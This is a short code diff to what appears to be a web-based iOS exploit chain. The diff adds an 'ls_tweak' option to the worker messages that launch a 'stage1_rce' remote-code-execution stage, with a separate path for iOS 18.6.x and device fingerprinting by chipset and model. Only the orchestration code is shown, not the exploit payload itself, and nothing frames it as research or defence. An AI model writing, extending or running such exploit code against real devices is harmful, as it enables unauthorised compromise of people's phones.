@@ -271,12 +271,13 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         print("desiredHost = " + desiredHost);
             if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
             {
-                print("Sending stage1_rce to worker (iOS 18.6 path)");
+                print("Sending stage1_rce to worker (iOS 18.6 path) tweak=" + (globalThis.__ls_tweak || 'fiveicon'));
                 worker.postMessage({
                     type: 'stage1_rce',
                     desiredHost,
                     randomValues,
-                    SERVER_LOG
+                    SERVER_LOG,
+                    ls_tweak: globalThis.__ls_tweak || 'fiveicon'
                 });
             }
             else
@@ -302,7 +303,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                         chipset,
                         device_model,
                         desiredHost,
-                        SERVER_LOG
+                        SERVER_LOG,
+                        ls_tweak: globalThis.__ls_tweak || 'fiveicon'
                 });
                             }
                         });
@@ -320,7 +322,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 chipset,
                 device_model,
                 desiredHost,
-                SERVER_LOG
+                SERVER_LOG,
+                ls_tweak: globalThis.__ls_tweak || 'fiveicon'
             });
                     }
         });
